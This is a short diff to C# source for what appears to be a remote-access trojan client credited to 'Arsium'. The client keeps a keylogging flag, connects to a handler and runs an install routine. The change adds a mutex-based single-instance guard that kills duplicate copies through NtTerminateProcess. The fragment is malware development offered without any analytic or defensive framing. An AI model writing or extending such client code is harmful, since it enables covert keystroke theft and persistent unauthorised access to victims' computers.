@@ -1,7 +1,7 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Windows.Forms;
 
 /* 
 || AUTHOR Arsium ||
@@ -13,6 +13,17 @@ namespace Client
     public class StarterClass
     {
         internal static bool KeylogOn;
+        private static bool AlreadyLaunched = false;
+        private static Mutex mutex;
+        public static void OneInstance()
+        {
+            mutex = new Mutex(true, Config.mutex, out AlreadyLaunched);
+            if (!AlreadyLaunched)
+            {
+                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
+            }
+        }
+
         static StarterClass() 
         {
             KeylogOn = false;
@@ -37,6 +48,7 @@ namespace Client
         [MTAThread]
         public static void Main() 
         {
+            OneInstance();
             clientHandler.ConnectStart();
             MakeInstall();
             new Thread(new ThreadStart(() => {
